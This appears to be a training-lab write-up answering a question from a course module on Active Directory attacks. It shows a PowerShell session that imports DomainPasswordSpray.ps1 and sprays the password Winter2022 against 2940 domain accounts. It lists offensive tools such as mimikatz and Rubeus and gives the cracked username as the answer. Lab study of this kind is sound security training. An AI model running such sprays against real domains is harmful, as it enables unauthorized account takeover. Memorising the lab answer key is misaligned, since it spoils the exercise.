# Section 12: Internal Password Spraying - from Windows

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.

Context:
```powershell
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> dir


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/10/2022   6:05 PM                ADRecon
d-----        4/18/2022  11:23 AM                BloodHound-GUI
d-----        2/22/2022   1:42 PM                CrackMapExecWin
d-----         4/7/2022   8:25 PM                Group3r
d-----        2/24/2022   3:18 PM                mimikatz
d-----        4/18/2022  10:41 AM                neo4j
d-----         3/8/2024   4:32 AM                PingCastle
d-----         4/6/2022  12:13 PM                PowerUpSQL
d-----        2/22/2022   1:43 PM                Responder-Windows
d-----        2/22/2022   1:53 PM                SysinternalsSuite
-a----        8/15/2021   1:57 PM          18878 DomainPasswordSpray.ps1
-a----        8/15/2021   1:05 PM       11281853 GetUserSPNs_windows.exe
-a----        2/28/2022   7:40 PM         274432 Inveigh.exe
-a----        2/22/2022   1:19 PM         303194 Inveigh.ps1
-a----        12/6/2021   7:00 PM        7996928 kerbrute_Windows.exe
-a----        2/22/2022   1:16 PM         770279 PowerView.ps1
-a----        8/15/2021   1:04 PM        9894467 rpcdump_windows.exe
-a----        2/22/2022   1:30 PM         465408 Rubeus.exe
-a----         3/8/2022   2:45 PM         149205 SecurityAssessment.ps1
-a----         3/8/2022   8:37 PM         906752 SharpHound.exe
-a----        8/15/2021   2:49 PM         535040 SharpMapExec.exe
-a----        4/18/2022  12:55 PM         736256 SharpView.exe
-a----        8/15/2021   1:12 PM         744960 Snaffler.exe


PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2940 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2940 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2940 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Winter2022 against 2940 users. Current time is 2:26 AM
[*] Writing successes to spray_success
[*] SUCCESS! User:dbranch Password:Winter2022
```

**Answer:** `dbranch`

---

[Back to Module Index](./README.md)
